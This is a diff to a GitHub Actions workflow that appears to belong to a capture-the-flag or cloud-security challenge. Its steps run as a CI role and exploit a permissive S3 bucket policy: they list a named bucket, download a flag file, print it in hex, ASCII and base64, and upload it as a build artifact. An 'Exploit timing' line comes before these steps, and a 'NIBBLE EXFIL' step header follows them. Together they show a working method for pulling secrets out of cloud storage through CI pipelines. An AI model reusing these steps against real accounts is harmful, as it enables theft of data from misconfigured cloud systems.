@@ -34,20 +34,26 @@ jobs:
           END=$(date +%s%N)
           echo "Exploit timing: $(( (END - START) / 1000000 ))ms"
 
-      - name: Read flag via cicdRole (bucket policy Principal='*' allows same-account auth access)
-        continue-on-error: true
+      - name: Read flag via cicdRole and save as artifact
         run: |
           echo "=== List platform-bucket ==="
           aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --recursive
           echo
-          echo "=== GetObject flag-boto3.txt as cicdRole (same-acct bucket policy grant) ==="
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag-boto3.txt - 2>&1
+          echo "=== Download flag-boto3.txt ==="
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag-boto3.txt flag.txt
+          echo "=== Raw bytes (xxd) ==="
+          xxd flag.txt
+          echo "=== ASCII ==="
+          cat flag.txt
           echo
-          echo "=== s3api GetObject ==="
-          aws s3api get-object --bucket platform-bucket-009661764077-us-east-1 --key flag-boto3.txt /dev/stdout 2>&1
-          echo
-          echo "=== List codec bucket ==="
-          aws s3 ls s3://codec4f26c862a321ef5/ 2>&1 || echo "(denied)"
+          echo "=== Base64 ==="
+          base64 flag.txt
+
+      - name: Upload flag artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: flag
+          path: flag.txt
 
       - name: NIBBLE EXFIL byte[0] hi-nibble (fallback if S3 GET above failed)
         run: |
